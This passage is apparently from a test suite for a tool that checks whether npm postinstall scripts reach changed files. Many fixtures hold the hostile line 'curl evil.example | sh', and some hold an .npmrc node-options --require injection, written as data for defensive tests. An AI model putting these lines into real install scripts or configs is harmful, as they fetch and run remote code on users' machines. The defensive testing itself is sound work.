    const cmd = Array.from({ length: n }, (_, i) => `cat test/s${i}.sh | sh`).join("; ");
    const mk = (last: string) => Object.fromEntries(Array.from({ length: n }, (_, i) => [`test/s${i}.sh`, i === n - 1 ? last : "echo a\n"]));
    expect(held({ postinstall: cmd }, mk("echo a\n"), mk("curl evil.example | sh\n"))).toBe(true);
  });

  test("5. each script starts at the root", () => {
    expect(held({ postinstall: "npm run a && npm run b", a: "cd lib", b: "node test/setup.js" }, { "lib/k.js": "1\n", "test/setup.js": "1\n" }, { "lib/k.js": "1\n", "test/setup.js": "evil()\n" })).toBe(true);
  });

  test("6. joined options and git program settings", () => {
    for (const cmd of ["tar -Ish -xf test/x.tar", "rsync -essh a b", "git -c core.hooksPath=test/h commit", "git -c core.sshCommand='sh test/x.sh' fetch", "GIT_SSH_COMMAND='sh test/x.sh' git fetch"]) {
      expect(inert(cmd), cmd).toBe(true);
    }
  });

  test("7. a sourced file then a script", () => {
    expect(inert(". test/env.sh && node a.js", "test/env.sh", { "a.js": "1\n" })).toBe(true);
  });
});

describe("round 28: heredoc cost, quoted runners, archive case, narrow forms", () => {
  const inert = (cmd: string, f = "test/x.sh", extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [f]: "echo a\n", ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. repeated unterminated heredocs do not cost quadratic time", () => {
    for (const interp of ["node", "python3", "sh"]) {
      const cmd = Array.from({ length: 3000 }, () => `${interp} <<A`).join("; ");
      const t = Date.now();
      held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
      expect(Date.now() - t, interp).toBeLessThan(3000);
    }
    const terminated = Array.from({ length: 500 }, () => "node <<A\nrequire('./test/x.js')\nA").join("\n");
    expect(inert(terminated, "test/x.js")).toBe(true);
  });

  test("2. a runner inside a quoted string in an unsplit body", () => {
    expect(held({ postinstall: "bash -c 'npm run build' 2>&1 | tee log", build: "echo ok" }, { ".npmrc": "a=1\n" }, { ".npmrc": "node-options=--require=./x.js\n", "x.js": "evil()" })).toBe(true);
  });

  test("3. the archive suffix check ignores case", () => {
    const at = "@";
    expect(held({ postinstall: `npx pnpm${at}evil.TGZ build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: `npx pnpm${at}evil.Tar.gz build`, build: "echo ok" }, { "lib/a.js": "1\n" }, { "lib/a.js": "evil()\n" })).toBe(true);
  });

  test("4. runner wrappers, brace groups, cd, here-strings on a producer", () => {
    for (const cmd of ["npx sh < test/x.sh", "npm exec -- sh < test/x.sh", "{ cat test/x.sh; } | sh", "cat <<< \"$(cat test/x.sh)\" | sh"]) expect(inert(cmd), cmd).toBe(true);
    expect(inert("cd tools && sh run.sh > log", "tools/run.sh", { "tools/k": "1" })).toBe(true);
    expect(inert("cd test && sh x.sh > log")).toBe(true);
  });

  test("5. bun's .env files are runner configs", () => {
    expect(held({ postinstall: "npm run build", build: "echo ok" }, { ".env": "A=1\n" }, { ".env": "BUN_CONFIG_X=1\n" })).toBe(true);
  });
});

describe("round 29: unknown flags before the script read inert files, env assignments, huge fed files", () => {
  const inertOnly = (cmd: string) => held({ postinstall: cmd, build: "node test/x.js" }, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" });

  test("1. an unknown flag before the script name reads an inert-only change", () => {
    for (const cmd of ["yarn run -T build", "yarn -T build", "pnpm run --foo build", "pnpm --bar build", "bun run --bun build", "npm run --foo build", "yarn run -- build"]) {
      expect(inertOnly(cmd), cmd).toBe(true);
    }
    expect(inertOnly("npm run build")).toBe(true);
  });

  test("2. an env assignment does not stop the scan of the next commands", () => {
    expect(held({ postinstall: "FOO=1 node a.js && cd test && node b.js" }, { "a.js": "1\n", "test/b.js": "1\n" }, { "a.js": "1\n", "test/b.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "FOO=1 npm run build && cd test && node b.js", build: "echo ok" }, { "test/b.js": "1\n" }, { "test/b.js": "evil()\n" })).toBe(true);
  });

  test("3. a fed file over 1 MB reads every file", () => {
    const big = `echo ${"a".repeat(1_100_000)}\n`;
    expect(held({ postinstall: "sh < scripts/big.sh" }, { "scripts/big.sh": big, "test/x.js": "1\n" }, { "scripts/big.sh": big, "test/x.js": "evil()\n" })).toBe(true);
  });
});

describe("round 30: fed shell bodies without an extension, here-strings on producers, heredoc segmentation and cost", () => {
  const inertOnly = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/setup.js": "1\n", ...extra }, { "test/setup.js": "evil()\n", ...extra });

  test("1. a file fed to a shell is a shell body whatever its name", () => {
    const f = { "scripts/prep": "cd test && node setup.js\n" };
    expect(inertOnly("sh < scripts/prep", f)).toBe(true);
    expect(inertOnly("cat scripts/prep | sh", f)).toBe(true);
    expect(inertOnly("cat scripts/prep | bash -s", f)).toBe(true);
  });

  test("2. literal text of a here-string on a producer stage", () => {
    expect(held({ postinstall: "cat <<< 'sh test/x.sh' | sh" }, { "test/x.sh": "echo a\n" }, { "test/x.sh": "curl evil.example | sh\n" })).toBe(true);
    expect(inertOnly("cat <<< 'cd test && node setup.js' | sh")).toBe(true);
  });

  test("3. an apostrophe in a heredoc body does not shift the quotes after it", () => {
    expect(inertOnly("cat <<EOF\ndon't\nEOF\ncd test && node setup.js && echo \"it's ok\"")).toBe(true);
    expect(inertOnly("cat <<-EOF\n\tdon't\n\tEOF\ncd test && node setup.js && echo \"it's ok\"")).toBe(true);
  });

  test("4. nested shell heredocs cost a bounded amount", () => {
    let s = "echo hi";
    for (let i = 30; i >= 1; i--) s = `sh <<D${i}\n${s}\nD${i}`;
    const t = Date.now();
    held({ postinstall: s }, { "a.js": "1\n" }, { "a.js": "2\n" });
    expect(Date.now() - t).toBeLessThan(3000);
    let c = "cd test && node setup.js";
    for (let i = 5; i >= 1; i--) c = `sh <<D${i}\n${c}\nD${i}`;
    expect(inertOnly(c)).toBe(true);
  });

  test("5. unterminated heredocs on separate lines cost a bounded amount", () => {
    const cmd = Array.from({ length: 3000 }, () => "node <<A").join("\n");
    const t = Date.now();
    held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
    expect(Date.now() - t).toBeLessThan(3000);
  });
});

describe("round 31: xargs lists, heredocs on producer stages, paired heredocs, arithmetic, many marks, path-run scripts", () => {
  const xfed = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/x.sh": "echo a\n", ...extra }, { "test/x.sh": "curl evil.example | sh\n", ...extra });
  const setup = (cmd: string) => held({ postinstall: cmd }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" });

  test("1. xargs input is a list of arguments, not commands", () => {
    expect(xfed("cat list.txt | xargs sh", { "list.txt": "test/x.sh\n" })).toBe(true);
    expect(xfed("cat list.txt | xargs -n1 bash", { "list.txt": "test/x.sh\n" })).toBe(true);
  });

  test("2. a heredoc on a producer stage reaches the downstream shell or the written file", () => {
    for (const cmd of ["cat <<EOF | sh\nsh test/x.sh\nEOF", "cat <<EOF > r.sh\nsh test/x.sh\nEOF\nsh r.sh", "tee r.sh <<EOF > /dev/null\nsh test/x.sh\nEOF\nsh r.sh", "cat <<EOF > r.sh\nsh test/x.sh\nEOF\n./r.sh"]) {
      expect(xfed(cmd, { "r.sh": "echo old\n" }), cmd).toBe(true);
    }
  });

  test("3. two heredocs opened on one line", () => {
    for (const cmd of ["cat <<A > /dev/null; sh <<B\nx\nA\nsh test/x.sh\nB", "cat <<A > o.txt && sh <<B\nx\nA\nsh test/x.sh\nB"]) expect(xfed(cmd), cmd).toBe(true);
  });

  test("4. an arithmetic shift is not a heredoc", () => {
    expect(setup("echo $((1 << A))\ncd test && node setup.js\nA")).toBe(true);
  });

  test("5. many heredoc marks on one line cost a bounded amount", () => {
    for (const n of [10000, 50000]) {
      const cmd = `cat ${"<<A ".repeat(n)}\n${"A\n".repeat(32)}`;
      const t = Date.now();
      held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" });
      expect(Date.now() - t, String(n)).toBeLessThan(3000);
    }
  });

  test("6. a script run by its path is read as a body", () => {
    const f = { "scripts/setup.sh": "node test/setup.js\n" };
    expect(held({ postinstall: "./scripts/setup.sh > /dev/null" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "./scripts/setup.sh" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "scripts/setup.sh 2>&1 | tee log" }, { ...f, "test/setup.js": "1\n" }, { ...f, "test/setup.js": "evil()\n" })).toBe(true);
  });

  test("7. tar with bundled letters and no dash extracts", () => {
    expect(held({ postinstall: "tar xzf test/x.tgz > /dev/null && node build.js" }, { "test/x.tgz": "a", "build.js": "1\n" }, { "test/x.tgz": "b", "build.js": "1\n" })).toBe(true);
  });

  test("8. an env assignment does not hide the commands after it (base behavior)", () => {
    expect(setup("FOO=1 node a.js && cd test && node setup.js")).toBe(true);
  });

  test("9. a very long flag list does not overflow the stack", () => {
    const cmd = `cat x | node ${Array.from({ length: 50000 }, (_, i) => `--f${i} 1`).join(" ")}`;
    expect(() => held({ postinstall: cmd }, { "a.js": "1\n" }, { "a.js": "2\n" })).not.toThrow();
  });
});

describe("round 32: node and sh with options this code does not model", () => {
  const changed = (cmd: string, f: string) => held({ postinstall: cmd }, { [f]: "console.log(1)\n" }, { [f]: "curl evil.example | sh\n" });

  test("1. node options before the script", () => {
    const flags = ["--no-warnings", "--enable-source-maps", "--max-old-space-size=4096", "--title foo", "-C dev", "--trace-warnings", "--experimental-vm-modules", "--stack-size=2000", "--unhandled-rejections=strict", "--conditions dev", "--inspect", "--no-deprecation", "--preserve-symlinks", "--harmony", "--abort-on-uncaught-exception", "--use-strict"];
    for (const f of ["x.js", "scripts/postinstall.js", "test/x.js", "lib/x.js"]) {
      for (const flag of flags) expect(changed(`node ${flag} ${f}`, f), `${flag} ${f}`).toBe(true);
    }
    expect(changed("node -- x.js", "x.js")).toBe(true);
    expect(changed("node --some-new-flag x.js", "x.js")).toBe(true);
  });

  test("2. sh and bash options and extra arguments", () => {
    for (const [cmd, f] of [["sh -e x.sh", "x.sh"], ["bash -x test/x.sh", "test/x.sh"], ["bash --norc x.sh", "x.sh"], ["sh x.sh arg", "x.sh"], ["sh -eu scripts/x.sh a b", "scripts/x.sh"], ["bash -o pipefail test/x.sh", "test/x.sh"], ["bash --some-new-flag x.sh", "x.sh"], ["bash --rcfile test/rc.sh x.sh", "test/rc.sh"], ["sh -- test/x.sh", "test/x.sh"]] as const) {
      expect(changed(cmd, f), cmd).toBe(true);
    }
  });

  test("3. other runners with an unknown option still read the script", () => {
    for (const [cmd, f] of [["python3 -u x.py", "x.py"], ["python3 -X dev test/x.py", "test/x.py"], ["ruby -w x.rb", "x.rb"], ["perl -w x.pl", "x.pl"], ["deno run -A test/x.ts", "test/x.ts"], ["bun run --silent x.ts", "x.ts"], ["tsx --no-cache scripts/x.ts", "scripts/x.ts"]] as const) {
      expect(changed(cmd, f), cmd).toBe(true);
    }
  });

  test("4. tar flags do not make other commands extracts", () => {
    expect(held({ postinstall: "cp x.txt y.txt > /dev/null && node build.js" }, { "x.txt": "1", "build.js": "1\n" }, { "x.txt": "1", "build.js": "1\n", "README.md": "b\n" })).toBe(false);
  });
});

describe("round 33: c-strings, cd then node, script arguments, -s, ash, node after unknown flags", () => {
  const changed = (cmd: string, f: string, extra: Record<string, string> = {}, o = "console.log(1)\n") => held({ postinstall: cmd }, { [f]: o, ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. a c-string with a single command", () => {
    for (const [cmd, f] of [["sh -c 'node scripts/postinstall.js'", "scripts/postinstall.js"], ["bash -c 'sh scripts/x.sh'", "scripts/x.sh"], ["sh -c 'node --no-warnings x.js'", "x.js"], ["bash -lc 'node --enable-source-maps x.js'", "x.js"], ["sh -c 'cd . && node scripts/postinstall.js'", "scripts/postinstall.js"], ["bash -c \"node test/x.js\"", "test/x.js"]] as const) {
      expect(changed(cmd, f), cmd).toBe(true);
    }
  });

  test("2. ash and other shells", () => {
    expect(changed("ash -e x.sh > /dev/null", "x.sh")).toBe(true);
    expect(changed("ash --rcfile=x.sh -i", "x.sh")).toBe(true);
    expect(changed("dash x.sh arg", "x.sh")).toBe(true);
  });

  test("3. after cd, files are resolved from the directory moved to", () => {
    const lib = { "lib/setup.js": "require('../test/p.js')\n" };
    expect(held({ postinstall: "cd lib && node setup.js" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
  });

  test("4. arguments of a script a shell runs are read as files", () => {
    const rs = { "scripts/run.sh": "node \"$1\"\n" };
    expect(held({ postinstall: "sh scripts/run.sh test/evil.js" }, { ...rs, "test/evil.js": "1\n" }, { ...rs, "test/evil.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "sh scripts/run.sh sub/x.js" }, { ...rs, "sub/x.js": "1\n" }, { ...rs, "sub/x.js": "evil()\n" })).toBe(true);
  });

  test("5. bash -s reads stdin and its operands are parameters", () => {
    expect(held({ postinstall: "bash -s test/x.js" }, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" })).toBe(true);
  });

  test("6. node walks the script after -- or an unknown option, and keeps -e", () => {
    const bj = { "build.js": "require('./test/q.js')\n" };
    for (const cmd of ["node -- build.js", "node --foo build.js", "node --no-warnings build.js"]) {
      expect(held({ postinstall: cmd }, { ...bj, "test/q.js": "1\n" }, { ...bj, "test/q.js": "evil()\n" }), cmd).toBe(true);
    }
    expect(held({ postinstall: "node --no-warnings -e \"require('./test/e.js')\"" }, { "test/e.js": "1\n" }, { "test/e.js": "evil()\n" })).toBe(true);
  });
});

describe("round 34: relative references after a cd", () => {
  test("1. node with an option, and a shell script, after cd", () => {
    const lib = { "lib/setup.js": "require('../test/p.js')\n" };
    expect(held({ postinstall: "cd lib && node --no-warnings setup.js" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
    const sh = { "lib/x.sh": "sh ../test/p.sh\n" };
    expect(held({ postinstall: "cd lib && sh x.sh" }, { ...sh, "test/p.sh": "echo a\n" }, { ...sh, "test/p.sh": "curl evil.example | sh\n" })).toBe(true);
    expect(held({ postinstall: "cd lib && bash -x x.sh a" }, { ...sh, "test/p.sh": "echo a\n" }, { ...sh, "test/p.sh": "curl evil.example | sh\n" })).toBe(true);
    expect(held({ postinstall: "cd lib; sh -c 'node setup.js'" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
  });
});

describe("round 35: wrapped c-strings, parameters, long options after -c, cd then fed files", () => {
  const changed = (cmd: string, f: string, extra: Record<string, string> = {}, o = "console.log(1)\n") => held({ postinstall: cmd }, { [f]: o, ...extra }, { [f]: "curl evil.example | sh\n", ...extra });

  test("1. c-strings behind env and other wrappers", () => {
    for (const cmd of ["env bash -c 'node test/x.js'", "/usr/bin/env bash -c 'node test/x.js'", "/usr/bin/env sh -c 'node test/x.js'", "env -i FOO=1 sh -c 'node test/x.js'", "nohup sh -c 'node test/x.js'", "sudo -u root bash -lc 'node test/x.js'", "timeout 5 sh -c 'node test/x.js'", "nice -n 5 bash -c 'node test/x.js'", "env sh -c 'node test/x.js' > /dev/null", "/bin/bash -c 'node test/x.js'"]) {
      expect(changed(cmd, "test/x.js"), cmd).toBe(true);
    }
  });

  test("2. the words after a c-string are parameters that may name files", () => {
    for (const cmd of ["sh -c 'node \"$1\"' _ test/x.js", "bash -c 'node \"$1\"' _ test/x.js", "sh -c 'sh \"$0\"' test/x.js", "env sh -c 'node \"$1\"' _ test/x.js"]) {
      expect(changed(cmd, "test/x.js"), cmd).toBe(true);
    }
  });

  test("3. a double dash or a long option after -c", () => {
    for (const cmd of ["bash -c -- 'node test/evil.js'", "bash -c --norc 'node test/evil.js'", "bash -c --posix -- 'node test/evil.js'"]) {
      expect(changed(cmd, "test/evil.js"), cmd).toBe(true);
    }
  });

  test("4. joined option values and rcfile forms", () => {
    expect(changed("node --experimental-loader=./test/l.mjs x.js", "test/l.mjs", { "x.js": "1\n" })).toBe(true);
    expect(changed("node --env-file=test/e.env x.js", "test/e.env", { "x.js": "1\n" })).toBe(true);
    expect(changed("cd lib && bash --rcfile=rc.sh -i", "lib/rc.sh")).toBe(true);
  });

  test("5. a fed file after cd resolves from the new directory", () => {
    const f = { "lib/a.sh": "node ../test/p.js\n" };
    expect(held({ postinstall: "cd lib && sh < a.sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
    expect(held({ postinstall: "cd lib && cat a.sh | sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
  });

  test("6. a root script of the same name does not shadow the one in the cd directory", () => {
    const f = { "build.sh": "echo root\n", "lib/build.sh": "node ../test/p.js\n" };
    expect(held({ postinstall: "cd lib && sh build.sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
  });

  test("7. an env assignment before a command (base behavior)", () => {
    expect(held({ postinstall: "CI=1 node a.js; cd test && node setup.js" }, { "a.js": "1\n", "test/setup.js": "1\n" }, { "a.js": "1\n", "test/setup.js": "evil()\n" })).toBe(true);
  });
});
